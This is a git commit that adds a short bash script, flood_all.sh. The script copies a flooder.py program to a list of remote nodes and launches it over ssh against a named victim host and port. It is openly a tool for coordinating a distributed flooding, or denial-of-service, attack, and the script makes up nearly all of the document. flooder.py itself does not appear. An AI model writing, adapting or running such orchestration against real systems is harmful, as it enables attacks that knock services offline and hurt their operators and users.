a56590378a8df1159e1687804707f90541f1d00f
Rijnard van Tonder <rvantonder@gmail.com>
2012-10-04 22:42:39 +0200

    Added bash script to run from ssh

---
+++ flood_all.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+NODES=$#
+VICTIM=$1
+shift
+VICTIMPORT=$1
+shift
+
+NODES=$(($NODES - 2))
+
+for i in `seq $NODES`
+do
+  scp flooder.py rai@$1:~/
+  ssh -t rai@$1 'python flooder.py '$VICTIM' '$VICTIMPORT
+  shift
+done
